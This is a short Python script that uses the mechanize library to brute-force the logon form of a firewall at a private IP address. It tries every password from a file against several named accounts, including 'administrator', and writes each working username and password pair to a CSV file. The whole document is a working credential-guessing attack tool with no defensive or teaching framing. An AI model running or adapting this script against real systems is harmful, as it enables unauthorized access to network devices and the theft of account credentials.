
import mechanize

ids = ['administrator', 'md1209', 'md1207']
success = 0


def hack():
	global ids, success
	plist = open('pfile.txt', 'r').read().split(',')
	for id in ids:
		for p in plist:
			browser = mechanize.Browser()
			browser.set_handle_robots(False)
			browser.open("https://192.168.2.254:4100/wgcgi.cgi?action=fw_logon&style=fw_logon.xsl&fw_logon_type=status&redirect=http://192.168.0.66/")
			browser.select_form(nr=0)
			browser.form["user"] = id
			browser.form["pass"] = p
			browser.submit()
			if 'success' in str(browser.title()):
				tocsv(id, p)
				success += 1
				break
		print success


def tocsv(id, passw):
	f = open('p.csv', 'a')
	f.write(id + ", " + passw)
	f.write("\n")
	f.close()


if __name__ == '__main__':
	hack()
